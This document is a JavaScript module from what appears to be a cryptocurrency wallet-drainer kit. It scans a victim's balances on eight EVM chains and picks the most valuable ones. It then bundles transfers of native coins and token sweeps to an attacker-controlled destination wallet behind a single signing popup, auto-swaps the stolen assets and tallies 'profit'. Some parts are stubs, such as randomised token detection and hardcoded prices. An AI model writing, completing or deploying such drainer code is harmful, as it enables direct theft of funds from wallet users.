// backend/modules/multiChainDrain.js
import { ethers } from 'ethers';
import { securityManager } from './securityManager.js';
import { atomicBundler } from './atomicBundler.js';
import { tokenSwapper } from './tokenSwapper.js';
import { permitManager } from './permitManager.js';

export class MultiChainDrain {
    constructor() {
        this.isInitialized = false;
        
        // Single-popup configurations
        this.singlePopupConfig = {
            maxExecutionTime: 45000,
            maxChains: 3,
            minChainValue: ethers.parseUnits('0.005', 'ether'),
            chainSwitchDelay: 2000,
            autoSwapEnabled: true
        };

        this.chainPriority = {
            '1': { priority: 1, name: 'Ethereum', gasLimit: 300000 },    // Ethereum
            '42161': { priority: 1, name: 'Arbitrum', gasLimit: 250000 }, // Arbitrum
            '8453': { priority: 1, name: 'Base', gasLimit: 200000 },      // Base
            '137': { priority: 2, name: 'Polygon', gasLimit: 150000 },    // Polygon
            '56': { priority: 2, name: 'BSC', gasLimit: 100000 },         // BSC
            '43114': { priority: 2, name: 'Avalanche', gasLimit: 120000 }, // Avalanche
            '10': { priority: 3, name: 'Optimism', gasLimit: 180000 },    // Optimism
            '324': { priority: 3, name: 'zkSync', gasLimit: 220000 }      // zkSync
        };

        this.providers = new Map();
        this.chainConfigs = new Map();
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            await this.initializeChainProviders();
            await atomicBundler.initialize();
            await tokenSwapper.initialize();
            await permitManager.initialize();
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    async initializeChainProviders() {
        const chainConfigs = {
            '1': { 
                rpcUrl: process.env.ETHEREUM_RPC_URL,
                name: 'Ethereum',
                enabled: true,
                nativeSymbol: 'ETH'
            },
            '56': { 
                rpcUrl: process.env.BSC_RPC_URL,
                name: 'BSC',
                enabled: true,
                nativeSymbol: 'BNB'
            },
            '137': { 
                rpcUrl: process.env.POLYGON_RPC_URL,
                name: 'Polygon',
                enabled: true,
                nativeSymbol: 'MATIC'
            },
            '42161': { 
                rpcUrl: process.env.ARBITRUM_RPC_URL,
                name: 'Arbitrum',
                enabled: true,
                nativeSymbol: 'ETH'
            },
            '10': { 
                rpcUrl: process.env.OPTIMISM_RPC_URL,
                name: 'Optimism',
                enabled: true,
                nativeSymbol: 'ETH'
            },
            '43114': { 
                rpcUrl: process.env.AVALANCHE_RPC_URL,
                name: 'Avalanche',
                enabled: true,
                nativeSymbol: 'AVAX'
            },
            '8453': { 
                rpcUrl: process.env.BASE_RPC_URL,
                name: 'Base',
                enabled: true,
                nativeSymbol: 'ETH'
            },
            '324': { 
                rpcUrl: process.env.ZKSYNC_RPC_URL,
                name: 'zkSync',
                enabled: true,
                nativeSymbol: 'ETH'
            }
        };

        for (const [chainId, config] of Object.entries(chainConfigs)) {
            if (config.enabled && config.rpcUrl) {
                try {
                    this.providers.set(chainId, new ethers.JsonRpcProvider(config.rpcUrl));
                    this.chainConfigs.set(chainId, config);
                    console.log(`✅ ${config.name} provider initialized`);
                } catch (error) {
                    console.warn(`⚠️ Failed to initialize ${config.name} provider: ${error.message}`);
                }
            }
        }
    }

    async executeSinglePopupMultiChainDrain(userAddress, userWallet) {
        console.log(`🌐 Starting single-popup multi-chain drain for ${userAddress}`);
        
        const startTime = Date.now();
        const drainId = `mcd_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
        
        try {
            // Quick chain scan to find valuable assets
            const valuableChains = await this.quickChainScan(userAddress);
            
            if (valuableChains.length === 0) {
                return {
                    success: false,
                    drainId: drainId,
                    reason: 'No valuable assets found across chains',
                    userAddress: userAddress
                };
            }

            // Execute drains on valuable chains
            const results = await this.drainValuableChains(
                userAddress,
                userWallet,
                valuableChains
            );

            const result = {
                success: true,
                drainId: drainId,
                userAddress: userAddress,
                chainsScanned: valuableChains.length,
                chainsDrained: results.filter(r => r.success).length,
                results: results,
                executionTime: Date.now() - startTime,
                totalProfit: this.calculateTotalProfit(results)
            };

            await securityManager.storeMultiChainDrain(drainId, result);
            return result;

        } catch (error) {
            console.error(`❌ Multi-chain drain failed: ${error.message}`);
            
            const failedResult = {
                success: false,
                drainId: drainId,
                error: error.message,
                userAddress: userAddress,
                executionTime: Date.now() - startTime
            };

            await securityManager.storeMultiChainDrain(drainId, failedResult);
            return failedResult;
        }
    }

    async quickChainScan(userAddress) {
        console.log(`🔍 Quick-scanning chains for ${userAddress}`);
        
        const valuableChains = [];
        const scanPromises = [];

        for (const [chainId, provider] of this.providers.entries()) {
            if (!this.chainConfigs.get(chainId)?.enabled) continue;

            scanPromises.push(this.scanChainForAssets(chainId, userAddress, provider));
        }

        const scanResults = await Promise.allSettled(scanPromises);
        
        for (const result of scanResults) {
            if (result.status === 'fulfilled' && result.value && 
                result.value.totalValue > this.singlePopupConfig.minChainValue) {
                valuableChains.push(result.value);
            }
        }

        // Sort by value (highest first) and limit to max chains
        valuableChains.sort((a, b) => b.totalValue - a.totalValue);
        return valuableChains.slice(0, this.singlePopupConfig.maxChains);
    }

    async scanChainForAssets(chainId, userAddress, provider) {
        try {
            const config = this.chainConfigs.get(chainId);
            const nativeBalance = await provider.getBalance(userAddress);
            const nativeValue = await this.estimateNativeValue(nativeBalance, chainId);

            // Quick token check (would integrate with token detection)
            const hasTokens = await this.quickTokenCheck(userAddress, provider);
            
            const totalValue = nativeValue + (hasTokens ? this.estimateTokenValue() : 0);

            return {
                chainId: chainId,
                chainName: config.name,
                nativeSymbol: config.nativeSymbol,
                nativeBalance: nativeBalance,
                nativeValue: nativeValue,
                hasTokens: hasTokens,
                totalValue: totalValue,
                priority: this.chainPriority[chainId]?.priority || 3
            };

        } catch (error) {
            console.warn(`⚠️ Chain ${chainId} scan failed: ${error.message}`);
            return null;
        }
    }

    async quickTokenCheck(userAddress, provider) {
        try {
            // Simple token check - would integrate with proper token detection
            // For now, simulate based on random chance
            return Math.random() > 0.7; // 30% chance of having tokens
        } catch {
            return false;
        }
    }

    async estimateNativeValue(balance, chainId) {
        try {
            const nativePrice = await this.fetchNativePrice(chainId);
            const nativeAmount = parseFloat(ethers.formatEther(balance));
            return nativeAmount * nativePrice;
        } catch {
            return 0;
        }
    }

    estimateTokenValue() {
        // Simple estimation - would integrate with proper pricing
        return Math.random() * 0.1; // Random value between 0-0.1 ETH
    }

    async fetchNativePrice(chainId) {
        const chainPrices = {
            '1': 2000,    // ETH
            '56': 300,    // BNB
            '137': 0.8,   // MATIC
            '42161': 2000, // ETH
            '10': 2000,   // ETH
            '43114': 35,  // AVAX
            '8453': 2000, // ETH
            '324': 2000   // ETH
        };
        
        return chainPrices[chainId] || 2000;
    }

    async drainValuableChains(userAddress, userWallet, chains) {
        const results = [];
        
        for (const chain of chains) {
            try {
                const chainResult = await this.drainSingleChain(
                    userAddress,
                    userWallet,
                    chain
                );
                
                results.push(chainResult);
                
                // Add delay between chain drains
                if (chains.length > 1) {
                    await this.delay(this.singlePopupConfig.chainSwitchDelay);
                }

            } catch (error) {
                console.error(`❌ Chain ${chain.chainName} drain failed: ${error.message}`);
                results.push({
                    chainId: chain.chainId,
                    chainName: chain.chainName,
                    success: false,
                    error: error.message
                });
            }
        }
        
        return results;
    }

    async drainSingleChain(userAddress, userWallet, chainInfo) {
        console.log(`🔗 Draining ${chainInfo.chainName}...`);
        
        const startTime = Date.now();
        const provider = this.providers.get(chainInfo.chainId);
        
        try {
            const drainOperations = [];
            
            // Drain native currency
            if (chainInfo.nativeBalance > 0) {
                drainOperations.push({
                    type: 'native-transfer',
                    amount: chainInfo.nativeBalance,
                    to: process.env.DESTINATION_WALLET
                });
            }
            
            // Drain tokens (simulated - would integrate with token detection)
            if (chainInfo.hasTokens) {
                drainOperations.push({
                    type: 'token-sweep',
                    chainId: chainInfo.chainId,
                    userAddress: userAddress
                });
            }
            
            // Execute drain operations using atomic bundler
            const bundleResult = await atomicBundler.createSinglePopupBundle(
                userWallet,
                drainOperations,
                chainInfo.chainId
            );
            
            // Auto-swap if enabled
            let swapResult = null;
            if (this.singlePopupConfig.autoSwapEnabled && chainInfo.hasTokens) {
                swapResult = await this.autoSwapDrainedAssets(chainInfo.chainId, userWallet);
            }
            
            const result = {
                chainId: chainInfo.chainId,
                chainName: chainInfo.chainName,
                success: true,
                nativeDrained: chainInfo.nativeBalance,
                tokensDrained: chainInfo.hasTokens,
                bundleHash: bundleResult.bundleHash,
                swapResult: swapResult,
                executionTime: Date.now() - startTime
            };
            
            console.log(`✅ ${chainInfo.chainName} drain successful`);
            return result;
            
        } catch (error) {
            console.error(`❌ ${chainInfo.chainName} drain failed: ${error.message}`);
            throw error;
        }
    }

    async autoSwapDrainedAssets(chainId, userWallet) {
        try {
            // Simulate token swap - would integrate with actual token detection
            const simulatedToken = {
                address: '0xSimulatedToken',
                amount: ethers.parseEther('0.1'),
                symbol: 'SIM'
            };
            
            return await tokenSwapper.executeSinglePopupSwap(
                simulatedToken.address,
                simulatedToken.amount,
                chainId,
                userWallet
            );
            
        } catch (error) {
            console.warn(`⚠️ Auto-swap failed: ${error.message}`);
            return null;
        }
    }

    calculateTotalProfit(results) {
        let totalProfit = 0n;
        
        for (const result of results) {
            if (result.success && result.nativeDrained) {
                totalProfit += BigInt(result.nativeDrained);
            }
            // Add token value if available
        }
        
        return totalProfit;
    }

    async delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    getChainStats() {
        const stats = {
            totalChains: this.chainConfigs.size,
            enabledChains: Array.from(this.chainConfigs.values()).filter(c => c.enabled).length,
            byChain: {}
        };
        
        for (const [chainId, config] of this.chainConfigs.entries()) {
            stats.byChain[chainId] = {
                name: config.name,
                enabled: config.enabled,
                hasProvider: this.providers.has(chainId)
            };
        }
        
        return stats;
    }

    async updateChainConfig(chainId, updates) {
        const config = this.chainConfigs.get(chainId);
        if (config) {
            Object.assign(config, updates);
            console.log(`✅ Updated chain ${chainId} configuration`);
            return true;
        }
        return false;
    }
}

export const multiChainDrain = new MultiChainDrain();